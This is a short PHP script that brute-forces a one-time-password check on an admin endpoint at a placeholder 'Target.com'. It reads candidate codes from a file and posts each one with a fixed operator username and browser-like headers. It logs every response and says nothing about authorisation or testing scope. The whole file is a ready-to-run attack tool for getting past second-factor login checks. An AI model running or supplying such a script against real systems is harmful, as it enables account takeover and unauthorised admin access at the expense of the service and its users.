<?php

// Target URL
$url = 'https://Target.com/admin/v3/verifyOtp';

// Read OTPs from file
$otps = file("otps.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

// Initialize response storage
$allResponses = "";

// Headers
$headers = [
    'Host: Target.com',
    'Accept: application/json',
    'Accept-Language: en-US,en;q=0.5',
    'Accept-Encoding: gzip, deflate, br',
    'Content-Type: application/json',
    'Origin: https://Target.com',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'Priority: u=0',
    'Te: trailers'
];

// Counter for progress tracking
$counter = 0;

// Loop through each OTP and send request
foreach ($otps as $otp) {
    // Request data
    $data = json_encode([
        "serviceType" => "",
        "type" => "OPERATOR",
        "otp" => $otp,
        "userName" => "0000000000",
        "vNum" => ""
    ]);

    // Initialize cURL session
    $ch = curl_init();

    // Set cURL options
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_ENCODING, "gzip,deflate,br"); // To handle encoding

    // Execute request and store response
    $response = curl_exec($ch);

    // Close cURL session
    curl_close($ch);

    // Append response to log
    $allResponses .= "OTP: $otp\nResponse: $response\n\n";

    // Progress tracking
    $counter++;
    if ($counter % 5 == 0) {
        echo "Processed $counter OTPs\n";
    }
}

// Save responses to file
file_put_contents("otp_responses.txt", $allResponses);

echo "All OTPs processed. Results saved in result/otp_responses.txt\n";

?>
